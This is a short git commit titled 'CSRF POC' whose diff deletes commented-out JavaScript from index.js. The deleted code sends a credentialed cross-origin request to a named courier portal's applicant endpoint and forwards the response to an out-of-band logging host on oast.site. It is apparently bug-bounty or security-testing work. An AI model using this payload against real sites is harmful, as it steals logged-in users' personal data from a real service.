b94ed679c49f1a2052b6709c22e1be6a6a315f3c
MacBook Pro M2 <macbookprom2@Badreddine-Belkadi.local>
2025-11-16 19:21:57 +0100

    CSRF POC

--- index.js
+++ index.js
@@ -1,15 +1,1 @@
 console.log("Hello, World!");
-console.log("This is the index.js file.");
-console.log("Welcome to the project!");
-
-// var req = new XMLHttpRequest();
-// req.onload = reqListener;
-// req.open("get", "https://myportal.drivers.dpd.co.uk/esg/odf/applicant", true);
-// req.withCredentials = true;
-// req.send();
-
-// function reqListener() {
-//   location =
-//     "//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/logging?key=" +
-//     this.responseText;
-// }
